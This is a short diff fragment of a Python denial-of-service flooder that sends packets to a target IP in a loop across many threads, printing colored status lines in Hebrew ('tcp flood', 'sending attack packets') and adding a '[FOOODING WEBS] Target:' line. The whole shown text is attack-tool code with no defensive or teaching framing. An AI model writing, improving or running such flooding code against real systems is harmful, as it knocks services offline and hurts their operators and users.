@@ -92,11 +92,12 @@ def start():
         s.send(r)
         u += 1
         print("\033[92m[🌠\033[92m] \033[33mtcpלְהַצִיף \033[32m " +str(u)+ " \033[32mשלח חבילות התקפה \033[37m  " +ip+ "  \033[0m")
+        print("\033[92m[🌠\033[92m] \033[34m[FOOODING WEBS]  \033[33m " +str(u)+ " \033[33m  \033[34mTarget: " +ip+ "  \033[0m")
         
     except:
         s.close()
         print("\033[97m[💥\033[97m] \033[97mמציפים למטה")
-
+        
 for x in range(thread):
   thred = threading.Thread(target=start)
   thred.start()
